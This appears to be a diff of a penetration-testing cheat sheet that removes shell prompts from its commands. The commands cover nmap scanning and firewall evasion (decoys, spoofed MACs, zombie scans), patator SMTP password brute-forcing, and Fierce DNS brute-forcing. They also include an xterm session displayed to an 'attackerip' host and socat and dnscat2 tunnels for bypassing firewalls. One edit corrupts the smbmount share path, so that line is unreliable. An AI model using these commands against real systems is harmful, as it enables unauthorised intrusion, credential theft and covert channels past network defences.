@@ -9,48 +9,48 @@
 
 # Host discovery, generate a list of surviving hosts
 
-    $ nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
-    $ grep “Status: Up” Discovery.gnmap | cut -f 2 -d ‘ ‘ > LiveHosts.txt
+    nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
+    grep “Status: Up” Discovery.gnmap | cut -f 2 -d ‘ ‘ > LiveHosts.txt
 
     #http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
 
-    $ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
-    $ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
+    nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
+    nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
 
 # Port found, found all the ports, but UDP port scanning will be very slow
 
-    $ nmap -sS -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt
-    $ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
-    $ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
+    nmap -sS -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt
+    nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
+    nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
 
 # Displays the TCP / UDP port
-    $ grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “T:”$0}’
-    $ grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “U:”$0}’
+    grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “T:”$0}’
+    grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “U:”$0}’
 
 # Detect the service version
 
-    $ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
-    $ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
-    $ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
+    nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
+    nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
+    nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
 
 Nmap to avoid the firewall
 
 # Segmentation
-    $ nmap -f
+    nmap -f
 # Modify the default MTU size, but it must be a multiple of 8 (8, 16, 24, 32, etc.)
-    $ nmap –mtu 24
+    nmap –mtu 24
 # Generate random numbers of spoofing
-    $ nmap -D RND:10 [target]
+    nmap -D RND:10 [target]
 # Manually specify the IP to be spoofed
-    $ nmap -D decoy1,decoy2,decoy3 etc.
+    nmap -D decoy1,decoy2,decoy3 etc.
 # Botnet scanning, first need to find the botnet IP
-    $ nmap -sI [Zombie IP] [Target IP]
+    nmap -sI [Zombie IP] [Target IP]
 # Designated source terminal
-    $ nmap –source-port 80 IP
+    nmap –source-port 80 IP
 # Add a random number of data after each scan
-    $ nmap –data-length 25 IP
+    nmap –data-length 25 IP
 # MAC address spoofing, you can generate different host MAC address
-    $ nmap –spoof-mac Dell/Apple/3Com IP
+    nmap –spoof-mac Dell/Apple/3Com IP
 
 # Nmap for Web vulnerability scanning
 
@@ -69,18 +69,18 @@ Nmap to avoid the firewall
     Patator- password guessing attacks
 
     git clone https://github.com/lanjelot/patator.git /usr/share/patator
-    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
-    $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
-    $ patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
-    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
+    patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
+    patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+    patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+    patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
 
 # Use Fierce to brute DNS
 
 # Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server.
 
     # http://ha.ckers.org/fierce/
-    $ ./fierce.pl -dns example.com
-    $ ./fierce.pl –dns example.com –wordlist myWordList.txt
+    ./fierce.pl -dns example.com
+    ./fierce.pl –dns example.com –wordlist myWordList.txt
 
 # Use Nikto to scan Web services
 
@@ -267,7 +267,7 @@ find / -type l -ls
 
 # Mount the remote Windows shared folder
 
-    smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+    smbmount //X.X.X.X/c/mnt/remote/ -o username=user,password=pass,rw
 
 # Under Kali compile Exploit
 
@@ -579,7 +579,7 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     xterm -display attackerip:1
     /usr/openwin/bin/xterm -display attackerip:1
     or
-    $ DISPLAY=attackerip:0 xterm
+    DISPLAY=attackerip:0 xterm
 
 # XSS
 
@@ -616,27 +616,27 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
 
     SSH Over SCTP (using Socat)
 
-    $ socat SCTP-LISTEN:80,fork TCP:localhost:22
-    $ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
-    $ ssh -lusername localhost -D 8080 -p 1337
+    socat SCTP-LISTEN:80,fork TCP:localhost:22
+    socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
+    ssh -lusername localhost -D 8080 -p 1337
 
 # Metagoofil – Metadata collection tool
 
     Note: Metagoofil is a tool for collecting information using Google.
-    $ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
+    python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
 
 # Use a DNS tunnel to bypass the firewall
 
-    $ apt-get update
-    $ apt-get -y install ruby-dev git make g++
-    $ gem install bundler
-    $ git clone https://github.com/iagox86/dnscat2.git
-    $ cd dnscat2/server
-    $ bundle install
-    $ ruby ./dnscat2.rb
+    apt-get update
+    apt-get -y install ruby-dev git make g++
+    gem install bundler
+    git clone https://github.com/iagox86/dnscat2.git
+    cd dnscat2/server
+    bundle install
+    ruby ./dnscat2.rb
     dnscat2> New session established: 16059
     dnscat2> session -i 16059
 
     https://downloads.skullsecurity.org/dnscat2/
     https://github.com/lukebaggett/dnscat2-powershell
-    $ dnscat –host <dnscat server_ip>
+    dnscat –host <dnscat server_ip>
